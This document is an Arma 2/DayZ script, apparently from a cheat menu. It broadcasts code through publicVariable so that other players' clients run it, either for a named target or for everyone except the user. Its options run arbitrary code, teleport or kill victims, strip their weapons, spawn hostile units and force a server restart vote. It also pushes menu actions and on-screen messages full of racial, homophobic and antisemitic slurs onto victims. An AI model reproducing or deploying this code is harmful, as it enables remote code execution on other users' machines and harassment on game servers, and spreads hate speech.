TTT5NamePl = _this select 0;		// Player Name
TTT5OptionNR = _this select 1;	// Option Number
TTT5Exec = _this select 2;		// Option code to execute

// -- Options Numbers List -- //
// Index 0 = Teleport
// Index 1 = Kill
// Index 2 = Disable Input
// Index 3 = Fly High
// Index 4 = Chat Say
// Index 5 = Code Execute
// Index 6 = Animations

switch (TTT5OptionNR) do
{
	case 0:		// PlayMusic
	{
		// htelepos = The target teleport position
		TTT5NamePl = teleTarget;
		publicVariable "htelepos";	
		sleep 0.3;
		TTT5derCode = "(vehicle player) setpos [htelepos select 0, htelepos select 1, 0];";
	};
	case 1:		// Terrain
	{
		TTT5derCode = format ["setTerrainGrid %1", TTT5Exec];
	};
	case 2:		// ViewDistance
	{
		TTT5derCode = format ["setViewDistance %1", TTT5Exec];
	};
	case 3:		// Fog
	{
		TTT5derCode = format ["3 setFog %1", TTT5Exec];
	};
	case 4:		// Time
	{
		TTT5derCode = format ["setDate %1", TTT5Exec];
	};
    case 5:		// Weather
	{
		TTT5derCode = format ["3 setovercast %1", TTT5Exec];
	};
	case 6:		// Time
	{
		TTT5derCode = TTT5Exec;
	};
	case 7:		// Time
	{
		TTT5derCode = "serverCommand ""#vote restart""";
	};
	case 8:		// Time
	{
		TTT5derCode = format ["5 setRain %1", TTT5Exec];
	};
	case 9:		// Time
	{
		TTT5derCode = format ["vehicle player sidechat ""%1""", TTT5Exec];
	};
	case 10:		// PlayMusic
	{
		TTT5derCode = format ["player playMove %1", """" + TTT5Exec + """" + ";"];
	};
	case 11:		// PlayMusic
	{
		TTT5derCode = TTT5Exec;
	};
	case 12:		// Teleport
	{
	TTT5derCode = format ["playMusic %1", """" + TTT5Exec + """" + ";"];	
	};
	case 13:		// Teleport
	{
	TTT5derCode = "vehicle player addaction [""IamGay"", ""Soundpack\Dick.sqs"" , ""0""];
vehicle player  addaction [""IamNoob"", ""Soundpack\Dick1.sqs"" , ""1""];
vehicle player addaction [""IamFag"", ""Soundpack\Dick2.sqs"" , ""2""];
vehicle player addaction [""IamLoser"", ""Soundpack\Dick3.sqs"" , ""3""];
vehicle player  addaction [""IamNiggar"", ""Soundpack\Dick4.sqs"" , ""4""];
vehicle player addaction [""IamCreep"", ""Soundpack\Dick5.sqs"" , ""5""];
vehicle player addaction [""IlikeMasturbate"", ""Soundpack\Dick6.sqs"" , ""6""];
vehicle player addaction [""IlikeRubberDicks"", ""Soundpack\Dick7.sqs"" , ""7""];
vehicle player addaction [""IhavePussy"", ""Soundpack\Dick8.sqs"" , ""8""];
vehicle player addaction [""FuckMe"", ""Soundpack\Dick9.sqs"" , ""9""];
vehicle player addaction [""IamRetard"", ""Soundpack\Dick10.sqs"" , ""10""];
vehicle player addaction [""IamJerk"", ""Soundpack\Dick11.sqs"" , ""11""];
vehicle player addaction [""SpawnDickInMyAss"", ""Soundpack\Dick12.sqs"" , ""12""];
vehicle player  addaction [""SpawnGayClub"", ""Soundpack\Dick13.sqs"" , ""13""];
vehicle player addaction [""SpawnBallsInMymouth"", ""Soundpack\Dick14.sqf"" , ""14""];
vehicle player addaction [""FuckMeInAss"", ""Soundpack\Dick15.sqs"" , ""15""];
vehicle player addaction [""FuckMeInPussy"", ""Soundpack\Dick16.sqs"" , ""16""];
vehicle player addaction [""CallMyMother"", ""Soundpack\Dick17.sqs"" , ""17""];
vehicle player addaction [""CallMyFather"", ""Soundpack\Dick18.sqs"" , ""18""];
vehicle player addaction [""SpitMeInFace"", ""Soundpack\Dick19.sqs"" , ""19""];
vehicle player addaction [""IDontHaveDick"", ""Soundpack\Dick20.sqf"" , ""20""];";
	};
case 14:		// Teleport
    {  
TTT5derCode = "vehicle player removeAction 0;
vehicle player removeAction 1;
vehicle player removeAction 2;
vehicle player removeAction 3;
vehicle player removeAction 4;
vehicle player removeAction 5;
vehicle player removeAction 6;
vehicle player removeAction 7;
vehicle player removeAction 8;
vehicle player removeAction 9;
vehicle player removeAction 10;
vehicle player removeAction 11;
vehicle player removeAction 12;
vehicle player removeAction 13;
vehicle player removeAction 14;
vehicle player removeAction 15;
vehicle player removeAction 16;
vehicle player removeAction 17;
vehicle player removeAction 18;
vehicle player removeAction 19;
vehicle player removeAction 20;
vehicle player removeAction 21;
vehicle player removeAction 22;
vehicle player removeAction 23;
vehicle player removeAction 24;";	
	};
case 15:		// PlayMusic
	{
	TTT5derCode = format ["playSound %1", """" + TTT5Exec + """" + ";"];
	};
	case 16:		// PlayMusic
	{
	TTT5derCode = "PLANE1 = createVehicle [TTT5Exec,[(getPos player) select 0,(getPos player) select 1,30], [], 0, ""FLY""];Player moveInDriver PLANE1;";
	};
	case 17:		// PlayMusic
	{
	TTT5derCode = "bomb = ""Chukar"" createVehicleLocal position player;player attachTo [bomb,[0,0,0]];bomb setPos [(getPos player) select 0,(getPos player) select 1,800];";
	};
	case 18:		// PlayMusic
	{
	TTT5derCode = "resistance setFriend [west, 0]; resistance setFriend [east, 0];
               west setFriend [resistance, 0]; east setFriend [resistance, 0];
               c_ch34tsDevString_enter = createCenter resistance;
               TTT5_Str_team = createGroup resistance;
               ""Ins_Soldier_Sniper"" createunit [position player, TTT5_Str_team,""TTT5_Str_unit=this"",  1.0, ""COLONEL""];TTT5_Str_unit addmagazine ""100Rnd_556x45_BetaCMag"";TTT5_Str_unit addmagazine ""100Rnd_556x45_BetaCMag"";TTT5_Str_unit addmagazine ""100Rnd_556x45_BetaCMag""; TTT5_Str_unit addweapon ""MG36"";TTT5_Str_unit setSkill 1;";
	};
	case 19:		// PlayMusic
	{
	TTT5derCode = "player removeAllEventHandlers ""hit"";player removeAllEventHandlers ""dammaged"";(vehicle player) removeAllEventHandlers ""hit"";(vehicle player) removeAllEventHandlers ""dammaged"";player removeAllEventHandlers ""handleDamage"";";
	};
	case 20:		// PlayMusic
	{
	TTT5derCode = "[this] exec ""onPlayerRespawnAsSeagull.sqs""";
	};
	case 21:		// PlayMusic
	{
	TTT5derCode = "[this] exec ""startup.sqs""";
	};
	case 22:		// PlayMusic
	{
	TTT5derCode = "removeAllWeapons player;";
	};
	case 23:		// PlayMusic
	{
	TTT5derCode = "Alexstrng_center = createCenter west;
TTT5_Str_team = createGroup west;
TTT5Exec createunit [position player, TTT5_Str_team,""TTT5_Str_unit=this"",  1.0, ""COLONEL""];
addSwitchableUnit TTT5_Str_unit;
selectPlayer TTT5_Str_unit;";
	};
	case 24:		// PlayMusic
	{
	TTT5derCode = format ["player setFace %1", """" + TTT5Exec + """" + ";"];
	};
	case 25:		// PlayMusic
	{
	TTT5derCode = "hint ""------------------------------------------------------------------------------------------------------------------------------------------------------------------------HELLO FUCKS!----------------------------------------------------------------------------------------------------------------------------------------------------------------------"";";
	};
	case 26:		// PlayMusic
	{
	TTT5derCode = "hint ""WARNING!----------------WARNING!---------------------------------------------------------------------------------------------------------------------ADMIN IS NOOB---------------------------------------------------------------------------------------------------------------WARNING!----------------WARNING!"";";
	};
	case 27:		// PlayMusic
	{		
	TTT5derCode = format["[dayz_playerUID,dayz_characterID,'%1'] spawn player_humanityMorph;", TTT5Exec];
	};
	
};


switch (TTT5NamePl) do {
	case "":
	{
	hijExecString = TTT5derCode;
	};
	case "FUCKEMGRANDPAIHATEJEWS":
	{
	hijExecString = format["if((getPlayerUID player) != '%1') then{ _xcompiled = compile TTT5derCode;call _xcompiled; }", (getPlayerUID player)];
	};
	default {
	hijExecString = "if (name vehicle player == TTT5NamePl) then {_xcompiled = compile TTT5derCode;call _xcompiled;};";
	};
};
publicVariable "TTT5NamePl";
sleep 0.3;
publicVariable "TTT5derCode";
sleep 0.3;
publicVariable "TTT5Exec";
sleep 0.3;

nil = [hijExecString] execVM "DevTools\scripts\runMagicaly.sqf";

hint format["Network executed.. @ %1",TTT5NamePl];

